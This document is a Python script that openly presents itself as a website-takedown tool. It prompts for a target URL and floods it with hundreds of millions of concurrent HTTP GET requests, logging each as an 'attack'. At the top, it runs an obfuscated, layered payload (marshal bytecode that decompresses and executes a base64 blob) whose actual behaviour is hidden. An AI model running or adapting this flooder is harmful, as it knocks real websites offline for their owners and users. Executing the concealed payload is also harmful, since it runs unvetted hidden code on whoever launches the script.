import kodekeras24
exec(kodekeras.loads('c\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00@\x00\x00\x00sB\x00\x00\x00d\x00\x00d\x01\x00l\x00\x00Z\x00\x00d\x00\x00d\x01\x00l\x01\x00Z\x01\x00d\x00\x00d\x01\x00l\x02\x00Z\x02\x00e\x01\x00j\x03\x00e\x02\x00j\x04\x00d\x02\x00\x83\x01\x00\x83\x01\x00d\x01\x00\x04Ud\x01\x00S(\x03\x00\x00\x00i\xff\xff\xff\xffNs\xc0\x04\x00\x00eJzFVV1v2zYUfeevuLBRyG5tR/JHnHjNgxunH9ucGHG2l6QIZJmxhJqiIFENjKJAsec9tICNDsMKDFhRoMAe+4v0S3ZJibKcqcCwlxKSdc7luZdHtEhWoXm/CQ6fe/5iALG4aR7ICPFYwEMB0SrSkOdIeIxqPLcFLfKIOy+o0Cy0/TlnOaOkesznFC4wAchNyFmeD3fr+fwWjnLaQlqrE5fHIUaRtCQkzPNjQbNISkhEHe7Ps1hKyNxeZQFEhHFfuDpJYrKitq4rIak2S9olHJ+d/nxyfnFy3nz004/DU3i+K6iSuedgmVeGZQyM720/tsOV0TDayB7TWZjRDtKxHTou4i7iYRB6S8Q9FZeKfZke+xRhX8GljB5IbbyII4HkEMmUBoKyGQ2RWyYGzhzBMyodnPKXebf0MKJOyl9Lo23l1Ny1at7xahbNmkW35tauWfBrFgybO47N/2f5pbbs3YD6+x9Cd0AAXHeJL1CZ0qXNbAEjz/fgqR16FUKXKO3CwyOtt9qFhEmWMLEXWmu1i+JeSfWpZ/sLre4V1f0yNQ+pFveL4oMS8YSKrHZES7rHNj4rhFR3GpHLDGXpamulj1rGho+vn52eXDR07/Ts+Ifr0ZPz4bhOZitBI0xMF2brOk5BzeoemvXdQQjBNWJcmZ3O5WGbGYTlzEIWaGYiiTWxvut0kc8KfB/5iwLvICc8auHOgl9CzXCWuOCMOsHPyhe1ipa1WbJZJ5tPyeZ9sv41Wf+drN8q8KYIAEDJ3v5LVq5XcYmvfEx8hxck61/SK0VrLXyTXZs/Vfm/ZDdAqvtD9X3MIsi+YMqVr4Sfk80H1Y2x33S9LVCOP6f3+guon+wuiBXPpuKwz678Ldbv+02u97tO3mnSYfdh2zGMhctDyCMWG+R4n43PW6OTR2cFPZQ0Wfy/jPXEE248+9pYrhBBNNjbWyhVy+FsbxyO6IzvDK7GSja/f7t5/VDJFgDxArU6b689P4gL68Filxr22YNt9Dls8bMJXNjhggrI5wDFsrQ8WY9AlYSv1GyW15zIVNXu1FSncrSkNKj16njo+nIEk9y63hIP+DBWmxk2uQnhMezPBa+p3acBNS9oSEv1eiZJk9XjAVhpMPOsHtugnCOo5F8GGpzKLEXR170ogxYLbLn5geBlncINebxwRVp+K6jcq0kXDW0wHRX38dTNEez3ep1u9ma5R4v8A8xkYIg=(\x05\x00\x00\x00t\x07\x00\x00\x00marshalt\x04\x00\x00\x00zlibt\x06\x00\x00\x00base64t\n\x00\x00\x00decompresst\t\x00\x00\x00b64decode(\x00\x00\x00\x00(\x00\x00\x00\x00(\x00\x00\x00\x00s\x02\x00\x00\x00dgt\x08\x00\x00\x00<module>\x01\x00\x00\x00s\x02\x00\x00\x00$\x01'))
import socket
import time
import asyncio
import aiohttp
import fade
import os
import requests
# Clear command prompt based on the operating system
if os.name == "nt":  # Windows
    os.system("cls")
else:  # Unix/Linux/Mac
    os.system("clear")

logo = """
            ±± ±±                    ±± ±±  ±±
          ±±   ±± ±±    ±±   ±±    ±±       ±±  ±±  ±±     ±±
         ±±  ±±     ±±  ±± ±±  ±±  ±±       ±±  ±±   ±±   ±±
         ±±  ±±     ±±  ±±     ±±  ±± ±±    ±±  ±±    ±± ±±
         ±±  ±±     ±±  ±±     ±±  ±±       ±±  ±±   ±±   ±±
          ±±   ±± ±±    ±±     ±±  ±±       ±±  ±±  ±±     ±±
            ±± ±±                  ±±       ±±
╔═══════════════════════════════════════════════════════════════════╗
║\033[34m               TOOLS TO DETECT AND DROPPING WEBSITES_             \033[31m║
║\033[32m                          DESIGN BY: KF'24                        \033[31m║
║\033[33m                IF IN DOUBT OF ACCURACY, PLEASE HELP              \033[31m║
║\033[91m                        BY CHECKING THE HOST                      \033[31m║
║\033[36m                             ——oO0Oo——                            \033[31m║
╚═══════════════════════════════════════════════════════════════════╝
"""
faded_text = fade.fire(logo)
print(faded_text)
socket.socket(socket.AF_INET, socket.SOCK_STREAM)
addr = (str(),int())
ask = fade.pinkred("\033[33mEnter the target URL: \033[0m")
url = input(ask)
async def increment_view_count(session):
    try:
        async with session.get(url) as response:
            if response.status == 200:
                print("[+]  \033[32mRequest Sent  \033[33m" +url+"  \033[34mattack..!! \033[0m")
                print("[+]  \033[95mRequest Sent  \033[96m" +url+"  \033[92mattack..!! \033[0m")
            else:
                print("[!]  \033[96mRequest Sent  \033[32m" +url+"  \033[33mattack..!! \033[0m")
                print("[!]  \033[94mRequest Sent  \033[96m" +url+"  \033[37mattack..!! \033[0m")
    except aiohttp.ClientError as e:
        print("[💥]  \033[34mAn error occurred:\033[0m", e)

async def main():
    connector = aiohttp.TCPConnector(limit=None)  # Enable connection pooling
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = []
        for _ in range(19999):  # Increase the number of concurrent requests
            task = asyncio.create_task(increment_view_count(session))
            tasks.append(task)
            for i in range(19999):  # Increase the number of concurrent requests
                task = asyncio.create_task(increment_view_count(session))
                tasks.append(task)
            await asyncio.gather(*tasks)
        await asyncio.gather(*tasks)


if __name__ == "__main__":
    asyncio.run(main())
    
